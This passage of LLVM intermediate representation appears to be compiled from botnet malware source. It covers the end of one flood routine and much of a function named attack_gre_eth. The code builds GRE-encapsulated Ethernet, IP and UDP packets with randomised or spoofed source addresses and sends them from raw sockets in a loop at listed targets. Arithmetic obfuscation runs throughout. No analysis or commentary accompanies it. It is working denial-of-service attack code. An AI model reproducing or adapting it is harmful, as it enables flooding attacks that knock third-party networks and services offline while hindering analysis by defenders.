  %460 = or i32 -746857191, %458
  %461 = xor i32 %459, -1
  %462 = and i32 %461, %460
  %463 = and i32 %455, 65535
  %464 = trunc i32 %462 to i16
  %465 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %466 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %465, i32 0, i32 1
  store i16 %464, i16* %466, align 2
  br label %467

; <label>:467:                                    ; preds = %454, %450
  %468 = load i8, i8* %20, align 1
  %469 = icmp ne i8 %468, 0
  br i1 %469, label %474, label %470

; <label>:470:                                    ; preds = %467
  %471 = call i32 @rand_next()
  %472 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %473 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %472, i32 0, i32 9
  store i32 %471, i32* %473, align 4
  br label %480

; <label>:474:                                    ; preds = %467
  %475 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %476 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %475, i32 0, i32 9
  %477 = load i32, i32* %476, align 4
  %478 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %479 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %478, i32 0, i32 9
  store i32 %477, i32* %479, align 4
  br label %480

; <label>:480:                                    ; preds = %474, %470
  %481 = load i8, i8* %19, align 1
  %482 = icmp ne i8 %481, 0
  br i1 %482, label %483, label %486

; <label>:483:                                    ; preds = %480
  %484 = load i8*, i8** %31, align 8
  %485 = load i32, i32* %18, align 4
  call void @rand_str(i8* %484, i32 %485)
  br label %486

; <label>:486:                                    ; preds = %483, %480
  %487 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %488 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %487, i32 0, i32 7
  store i16 0, i16* %488, align 2
  %489 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %490 = bitcast %struct.iphdr* %489 to i16*
  %491 = call zeroext i16 @checksum_generic(i16* %490, i32 20)
  %492 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %493 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %492, i32 0, i32 7
  store i16 %491, i16* %493, align 2
  %494 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %495 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %494, i32 0, i32 7
  store i16 0, i16* %495, align 2
  %496 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %497 = bitcast %struct.iphdr* %496 to i16*
  %498 = call zeroext i16 @checksum_generic(i16* %497, i32 20)
  %499 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %500 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %499, i32 0, i32 7
  store i16 %498, i16* %500, align 2
  %501 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %502 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %501, i32 0, i32 3
  store i16 0, i16* %502, align 2
  %503 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %504 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %505 = bitcast %struct.udphdr* %504 to i8*
  %506 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %507 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %506, i32 0, i32 2
  %508 = load i16, i16* %507, align 2
  %509 = load i32, i32* %18, align 4
  %510 = sext i32 %509 to i64
  %511 = sub i64 0, 8
  %512 = sub i64 0, %510
  %513 = add i64 %511, %512
  %514 = sub i64 0, %513
  %515 = add i64 8, %510
  %516 = trunc i64 %514 to i32
  %517 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %503, i8* %505, i16 zeroext %508, i32 %516)
  %518 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %519 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %518, i32 0, i32 3
  store i16 %517, i16* %519, align 2
  %520 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %521 = load i32, i32* %9, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %520, i64 %522
  %524 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %523, i32 0, i32 0
  %525 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %524, i32 0, i32 0
  store i16 2, i16* %525, align 4
  %526 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %527 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %526, i32 0, i32 9
  %528 = load i32, i32* %527, align 4
  %529 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %530 = load i32, i32* %9, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %529, i64 %531
  %533 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %532, i32 0, i32 0
  %534 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %533, i32 0, i32 2
  %535 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %534, i32 0, i32 0
  store i32 %528, i32* %535, align 4
  %536 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %537 = load i32, i32* %9, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %536, i64 %538
  %540 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %539, i32 0, i32 0
  %541 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %540, i32 0, i32 1
  store i16 0, i16* %541, align 2
  %542 = load i32, i32* %10, align 4
  %543 = load i8*, i8** %26, align 8
  %544 = load i32, i32* %18, align 4
  %545 = sext i32 %544 to i64
  %546 = sub i64 0, %545
  %547 = sub i64 52, %546
  %548 = add i64 52, %545
  %549 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %550 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %551 = load i32, i32* %9, align 4
  %552 = sext i32 %551 to i64
  %553 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %550, i64 %552
  %554 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %553, i32 0, i32 0
  %555 = bitcast %struct.sockaddr_in* %554 to %struct.sockaddr*
  store %struct.sockaddr* %555, %struct.sockaddr** %549, align 8
  %556 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %557 = load %struct.sockaddr*, %struct.sockaddr** %556, align 8
  %558 = call i64 @sendto(i32 %542, i8* %543, i64 %547, i32 16384, %struct.sockaddr* %557, i32 16)
  br label %559

; <label>:559:                                    ; preds = %486
  %560 = load i32, i32* %9, align 4
  %561 = sub i32 0, %560
  %562 = sub i32 0, 1
  %563 = add i32 %561, %562
  %564 = sub i32 0, %563
  %565 = add nsw i32 %560, 1
  store i32 %564, i32* %9, align 4
  br label %336

; <label>:566:                                    ; preds = %336
  br label %335

; <label>:567:                                    ; preds = %84, %78
  ret void
}

declare zeroext i16 @checksum_generic(i16*, i32) #3

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #3

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 512)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %4
  br label %592

; <label>:87:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %592

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %331, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %337

; <label>:101:                                    ; preds = %96
  %102 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %22, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.grehdr*
  store %struct.grehdr* %115, %struct.grehdr** %23, align 8
  %116 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %117 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %116, i64 1
  %118 = bitcast %struct.grehdr* %117 to %struct.ethhdr*
  store %struct.ethhdr* %118, %struct.ethhdr** %24, align 8
  %119 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %120 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %119, i64 1
  %121 = bitcast %struct.ethhdr* %120 to %struct.iphdr*
  store %struct.iphdr* %121, %struct.iphdr** %25, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i64 1
  %124 = bitcast %struct.iphdr* %123 to %struct.udphdr*
  store %struct.udphdr* %124, %struct.udphdr** %26, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %126 = bitcast %struct.iphdr* %125 to i8*
  %127 = load i8, i8* %126, align 4
  %128 = xor i8 15, -1
  %129 = xor i8 %127, %128
  %130 = and i8 %129, %127
  %131 = and i8 %127, 15
  %132 = xor i8 %130, -1
  %133 = xor i8 64, -1
  %134 = xor i8 127, -1
  %135 = and i8 %132, 127
  %136 = and i8 %130, %134
  %137 = and i8 %133, 127
  %138 = and i8 64, %134
  %139 = or i8 %135, %136
  %140 = or i8 %137, %138
  %141 = xor i8 %139, %140
  %142 = or i8 %132, %133
  %143 = xor i8 %142, -1
  %144 = or i8 127, %134
  %145 = and i8 %143, %144
  %146 = or i8 %141, %145
  %147 = or i8 %130, 64
  store i8 %146, i8* %126, align 4
  %148 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %149 = bitcast %struct.iphdr* %148 to i8*
  %150 = load i8, i8* %149, align 4
  %151 = xor i8 -16, -1
  %152 = xor i8 %150, %151
  %153 = and i8 %152, %150
  %154 = and i8 %150, -16
  %155 = and i8 %153, 5
  %156 = xor i8 %153, 5
  %157 = or i8 %155, %156
  %158 = or i8 %153, 5
  store i8 %157, i8* %149, align 4
  %159 = load i8, i8* %12, align 1
  %160 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 1
  store i8 %159, i8* %161, align 1
  %162 = load i32, i32* %18, align 4
  %163 = sext i32 %162 to i64
  %164 = sub i64 66, 1147401431236287691
  %165 = add i64 %164, %163
  %166 = add i64 %165, 1147401431236287691
  %167 = add i64 66, %163
  %168 = trunc i64 %166 to i16
  %169 = call zeroext i16 @htons(i16 zeroext %168) #7
  %170 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 2
  store i16 %169, i16* %171, align 2
  %172 = load i16, i16* %13, align 2
  %173 = call zeroext i16 @htons(i16 zeroext %172) #7
  %174 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 3
  store i16 %173, i16* %175, align 4
  %176 = load i8, i8* %14, align 1
  %177 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 5
  store i8 %176, i8* %178, align 4
  %179 = load i8, i8* %15, align 1
  %180 = icmp ne i8 %179, 0
  br i1 %180, label %181, label %185

; <label>:181:                                    ; preds = %101
  %182 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %183 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 4
  store i16 %182, i16* %184, align 2
  br label %185

; <label>:185:                                    ; preds = %181, %101
  %186 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 6
  store i8 47, i8* %187, align 1
  %188 = load i32, i32* %21, align 4
  %189 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 8
  store i32 %188, i32* %190, align 4
  %191 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %192 = load i32, i32* %9, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %191, i64 %193
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i32 0, i32 1
  %196 = load i32, i32* %195, align 4
  %197 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 9
  store i32 %196, i32* %198, align 4
  %199 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %200 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %201 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %200, i32 0, i32 1
  store i16 %199, i16* %201, align 2
  %202 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %203 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %204 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %203, i32 0, i32 2
  store i16 %202, i16* %204, align 1
  %205 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %206 = bitcast %struct.iphdr* %205 to i8*
  %207 = load i8, i8* %206, align 4
  %208 = xor i8 15, -1
  %209 = xor i8 %207, %208
  %210 = and i8 %209, %207
  %211 = and i8 %207, 15
  %212 = xor i8 %210, -1
  %213 = xor i8 64, -1
  %214 = xor i8 -124, -1
  %215 = and i8 %212, -124
  %216 = and i8 %210, %214
  %217 = and i8 %213, -124
  %218 = and i8 64, %214
  %219 = or i8 %215, %216
  %220 = or i8 %217, %218
  %221 = xor i8 %219, %220
  %222 = or i8 %212, %213
  %223 = xor i8 %222, -1
  %224 = or i8 -124, %214
  %225 = and i8 %223, %224
  %226 = or i8 %221, %225
  %227 = or i8 %210, 64
  store i8 %226, i8* %206, align 4
  %228 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %229 = bitcast %struct.iphdr* %228 to i8*
  %230 = load i8, i8* %229, align 4
  %231 = xor i8 -16, -1
  %232 = xor i8 %230, %231
  %233 = and i8 %232, %230
  %234 = and i8 %230, -16
  %235 = and i8 %233, 5
  %236 = xor i8 %233, 5
  %237 = or i8 %235, %236
  %238 = or i8 %233, 5
  store i8 %237, i8* %229, align 4
  %239 = load i8, i8* %12, align 1
  %240 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 1
  store i8 %239, i8* %241, align 1
  %242 = load i32, i32* %18, align 4
  %243 = sext i32 %242 to i64
  %244 = sub i64 0, %243
  %245 = sub i64 28, %244
  %246 = add i64 28, %243
  %247 = trunc i64 %245 to i16
  %248 = call zeroext i16 @htons(i16 zeroext %247) #7
  %249 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i32 0, i32 2
  store i16 %248, i16* %250, align 2
  %251 = load i16, i16* %13, align 2
  %252 = zext i16 %251 to i32
  %253 = xor i32 %252, -1
  %254 = and i32 1934854509, %253
  %255 = xor i32 1934854509, -1
  %256 = and i32 %252, %255
  %257 = xor i32 -1, -1
  %258 = and i32 %257, 1934854509
  %259 = and i32 -1, %255
  %260 = or i32 %254, %256
  %261 = or i32 %258, %259
  %262 = xor i32 %260, %261
  %263 = xor i32 %252, -1
  %264 = trunc i32 %262 to i16
  %265 = call zeroext i16 @htons(i16 zeroext %264) #7
  %266 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %267 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %266, i32 0, i32 3
  store i16 %265, i16* %267, align 4
  %268 = load i8, i8* %14, align 1
  %269 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 5
  store i8 %268, i8* %270, align 4
  %271 = load i8, i8* %15, align 1
  %272 = icmp ne i8 %271, 0
  br i1 %272, label %273, label %277

; <label>:273:                                    ; preds = %185
  %274 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %275 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %276 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %275, i32 0, i32 4
  store i16 %274, i16* %276, align 2
  br label %277

; <label>:277:                                    ; preds = %273, %185
  %278 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %279 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %278, i32 0, i32 6
  store i8 17, i8* %279, align 1
  %280 = call i32 @rand_next()
  %281 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 8
  store i32 %280, i32* %282, align 4
  %283 = load i8, i8* %20, align 1
  %284 = icmp ne i8 %283, 0
  br i1 %284, label %285, label %291

; <label>:285:                                    ; preds = %277
  %286 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %287 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %286, i32 0, i32 9
  %288 = load i32, i32* %287, align 4
  %289 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 9
  store i32 %288, i32* %290, align 4
  br label %311

; <label>:291:                                    ; preds = %277
  %292 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %293 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %292, i32 0, i32 8
  %294 = load i32, i32* %293, align 4
  %295 = sub i32 0, 1024
  %296 = add i32 %294, %295
  %297 = sub i32 %294, 1024
  %298 = xor i32 %296, -1
  %299 = and i32 243694682, %298
  %300 = xor i32 243694682, -1
  %301 = and i32 %296, %300
  %302 = xor i32 -1, -1
  %303 = and i32 %302, 243694682
  %304 = and i32 -1, %300
  %305 = or i32 %299, %301
  %306 = or i32 %303, %304
  %307 = xor i32 %305, %306
  %308 = xor i32 %296, -1
  %309 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %310 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %309, i32 0, i32 9
  store i32 %307, i32* %310, align 4
  br label %311

; <label>:311:                                    ; preds = %291, %285
  %312 = load i16, i16* %16, align 2
  %313 = call zeroext i16 @htons(i16 zeroext %312) #7
  %314 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %315 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %314, i32 0, i32 0
  store i16 %313, i16* %315, align 2
  %316 = load i16, i16* %17, align 2
  %317 = call zeroext i16 @htons(i16 zeroext %316) #7
  %318 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %319 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %318, i32 0, i32 1
  store i16 %317, i16* %319, align 2
  %320 = load i32, i32* %18, align 4
  %321 = sext i32 %320 to i64
  %322 = sub i64 0, 8
  %323 = sub i64 0, %321
  %324 = add i64 %322, %323
  %325 = sub i64 0, %324
  %326 = add i64 8, %321
  %327 = trunc i64 %325 to i16
  %328 = call zeroext i16 @htons(i16 zeroext %327) #7
  %329 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %330 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %329, i32 0, i32 2
  store i16 %328, i16* %330, align 2
  br label %331

; <label>:331:                                    ; preds = %311
  %332 = load i32, i32* %9, align 4
  %333 = add i32 %332, -1832554510
  %334 = add i32 %333, 1
  %335 = sub i32 %334, -1832554510
  %336 = add nsw i32 %332, 1
  store i32 %335, i32* %9, align 4
  br label %96

; <label>:337:                                    ; preds = %96
  br label %338

; <label>:338:                                    ; preds = %591, %337
  store i32 0, i32* %9, align 4
  br label %339

; <label>:339:                                    ; preds = %585, %338
  %340 = load i32, i32* %9, align 4
  %341 = load i8, i8* %5, align 1
  %342 = zext i8 %341 to i32
  %343 = icmp slt i32 %340, %342
  br i1 %343, label %344, label %591

; <label>:344:                                    ; preds = %339
  %345 = load i8**, i8*** %11, align 8
  %346 = load i32, i32* %9, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds i8*, i8** %345, i64 %347
  %349 = load i8*, i8** %348, align 8
  store i8* %349, i8** %30, align 8
  %350 = load i8*, i8** %30, align 8
  %351 = bitcast i8* %350 to %struct.iphdr*
  store %struct.iphdr* %351, %struct.iphdr** %31, align 8
  %352 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %353 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %352, i64 1
  %354 = bitcast %struct.iphdr* %353 to %struct.grehdr*
  store %struct.grehdr* %354, %struct.grehdr** %32, align 8
  %355 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %356 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %355, i64 1
  %357 = bitcast %struct.grehdr* %356 to %struct.ethhdr*
  store %struct.ethhdr* %357, %struct.ethhdr** %33, align 8
  %358 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %359 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %358, i64 1
  %360 = bitcast %struct.ethhdr* %359 to %struct.iphdr*
  store %struct.iphdr* %360, %struct.iphdr** %34, align 8
  %361 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %362 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %361, i64 1
  %363 = bitcast %struct.iphdr* %362 to %struct.udphdr*
  store %struct.udphdr* %363, %struct.udphdr** %35, align 8
  %364 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %365 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %364, i64 1
  %366 = bitcast %struct.udphdr* %365 to i8*
  store i8* %366, i8** %36, align 8
  %367 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %368 = load i32, i32* %9, align 4
  %369 = sext i32 %368 to i64
  %370 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %367, i64 %369
  %371 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %370, i32 0, i32 2
  %372 = load i8, i8* %371, align 4
  %373 = zext i8 %372 to i32
  %374 = icmp slt i32 %373, 32
  br i1 %374, label %375, label %400

; <label>:375:                                    ; preds = %344
  %376 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %377 = load i32, i32* %9, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %376, i64 %378
  %380 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %379, i32 0, i32 1
  %381 = load i32, i32* %380, align 4
  %382 = call i32 @ntohl(i32 %381) #7
  %383 = call i32 @rand_next()
  %384 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %385 = load i32, i32* %9, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %384, i64 %386
  %388 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %387, i32 0, i32 2
  %389 = load i8, i8* %388, align 4
  %390 = zext i8 %389 to i32
  %391 = lshr i32 %383, %390
  %392 = sub i32 0, %382
  %393 = sub i32 0, %391
  %394 = add i32 %392, %393
  %395 = sub i32 0, %394
  %396 = add i32 %382, %391
  %397 = call i32 @htonl(i32 %395) #7
  %398 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i32 0, i32 9
  store i32 %397, i32* %399, align 4
  br label %400

; <label>:400:                                    ; preds = %375, %344
  %401 = load i32, i32* %21, align 4
  %402 = icmp eq i32 %401, -1
  br i1 %402, label %403, label %407

; <label>:403:                                    ; preds = %400
  %404 = call i32 @rand_next()
  %405 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %406 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %405, i32 0, i32 8
  store i32 %404, i32* %406, align 4
  br label %407

; <label>:407:                                    ; preds = %403, %400
  %408 = load i16, i16* %13, align 2
  %409 = zext i16 %408 to i32
  %410 = icmp eq i32 %409, 65535
  br i1 %410, label %411, label %436

; <label>:411:                                    ; preds = %407
  %412 = call i32 @rand_next()
